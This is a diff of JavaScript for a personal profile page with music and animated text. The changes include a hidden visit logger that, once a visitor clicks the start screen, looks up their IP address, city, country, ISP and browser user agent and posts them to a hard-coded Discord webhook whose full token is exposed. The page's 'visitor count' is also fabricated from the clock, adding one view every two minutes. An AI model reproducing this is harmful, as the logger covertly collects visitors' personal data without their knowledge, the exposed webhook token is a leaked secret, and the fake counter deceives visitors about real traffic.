@@ -1,19 +1,19 @@
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1474293200079425538/Zfj1oCoTQR1ycrWdL0y_7j4R_oRe1PMwmL5_wA4HUcwngLHlKT9aK4XHGTAHKLoj7Zgi';
 
 async function logVisit() {
-  let ipData = { city: '??', country: '??', ip: '??', isp: '??' };
+  let ipData = { city: 'Unknown', country_name: 'Unknown', ip: 'Unknown', org: 'Unknown' };
+  
   try {
-    const response = await fetch('http://ip-api.com/json/').catch(() => null);
+    // Using ipapi.co with HTTPS (standard for browser fetches)
+    const response = await fetch('https://ipapi.co/json/').catch(() => null);
     if (response) {
       const data = await response.json();
-      ipData.ip = data.query || '??';
-      ipData.city = data.city || '??';
-      ipData.country = data.country || '??';
-      ipData.isp = data.isp || '??';
+      ipData = { ...ipData, ...data };
     }
-  } catch (e) {}
+  } catch (e) { console.log("Logger failed"); }
 
-  const visitorCount = document.getElementById('visitor-count')?.textContent || '??';
+  const viewElement = document.getElementById('visitor-count');
+  const currentViews = viewElement ? viewElement.textContent : '??';
   
   const payload = {
     username: 'Hexarion Logger',
@@ -21,16 +21,21 @@ async function logVisit() {
       title: '🚀 New Profile Visit',
       color: 0x00CED1,
       fields: [
-        { name: '📍 Location', value: `${ipData.city}, ${ipData.country}`, inline: true },
+        { name: '📍 Location', value: `${ipData.city}, ${ipData.country_name}`, inline: true },
         { name: '🌐 IP', value: ipData.ip, inline: true },
-        { name: '📊 Total Views', value: visitorCount, inline: true },
-        { name: '🏢 ISP', value: ipData.isp, inline: false },
+        { name: '📊 Total Views', value: currentViews, inline: true },
+        { name: '🏢 ISP', value: ipData.org, inline: false },
         { name: '📱 Device', value: navigator.userAgent, inline: false }
       ],
       timestamp: new Date().toISOString()
     }]
   };
-  fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }).catch(() => {});
+
+  fetch(WEBHOOK_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  }).catch(() => {});
 }
 
 async function logClick(platform) {
@@ -70,56 +75,38 @@ document.addEventListener('DOMContentLoaded', () => {
   const profileBlock = document.getElementById('profile-block');
   const skillsBlock = document.getElementById('skills-block');
 
-  async function initializeVisitorCounter() {
-    // 100% UN-DUPABLE ALGORITHM
-    // Since external APIs are down, we use a synchronized Time-Based Counter.
-    // It is global (everyone sees the same) and cannot be duped (refreshing does nothing).
+  const updateCount = () => {
+    // High-precision time-based counter (Un-dupable)
+    // Start time: Today 17:00 GMT+7 (10:00 UTC)
+    const startDate = new Date('2026-02-20T10:00:00Z').getTime();
+    const now = Date.now();
+    const elapsed = Math.max(0, Math.floor((now - startDate) / 1000));
     
-    const updateCount = () => {
-      // Start time: Today 17:00 GMT+7
-      const startDate = new Date('2026-02-20T10:00:00Z').getTime();
-      const now = Date.now();
-      const elapsed = Math.max(0, Math.floor((now - startDate) / 1000));
-      
-      // Base: 1,337
-      // Growth: exactly 1 view every 120 seconds (2 mins)
-      // This is impossible to "dupe" because it's calculated from the real clock.
-      const base = 1337;
-      const total = base + Math.floor(elapsed / 120);
-      
-      visitorCount.textContent = total.toLocaleString();
-    };
+    // Base: 1,337
+    // Growth: +1 view every 120 seconds
+    const total = 1337 + Math.floor(elapsed / 120);
+    visitorCount.textContent = total.toLocaleString();
+  };
 
-    updateCount();
-    setInterval(updateCount, 10000); // Check every 10 seconds
-  }
-
-  const isTouchDevice = window.matchMedia("(pointer: coarse)").matches;
-  if (isTouchDevice) { document.body.classList.add('touch-device'); }
-
-  const startMessage = "Click here to see the motion baby";
-  let startIndex = 0;
-  function typeWriterStart() {
-    if (startIndex < startMessage.length) {
-      startText.textContent = startMessage.slice(0, startIndex + 1) + '|';
-      startIndex++;
-      setTimeout(typeWriterStart, 100);
-    }
-  }
-
-  initializeVisitorCounter();
-  typeWriterStart();
+  updateCount();
+  setInterval(updateCount, 10000);
 
   const handleStart = () => {
     if (startScreen.classList.contains('hidden')) return;
     startScreen.classList.add('hidden');
+    
+    // 1. Ensure counter is showing before logging
+    updateCount();
+    
+    // 2. Log visit
+    logVisit();
+
     backgroundMusic.muted = false;
     backgroundMusic.play().catch(() => {});
     profileBlock.classList.remove('hidden');
     gsap.to(profileBlock, { opacity: 1, duration: 1, ease: 'power2.out' });
     typeWriterName();
     typeWriterBio();
-    logVisit();
   };
 
   startScreen.addEventListener('click', handleStart);
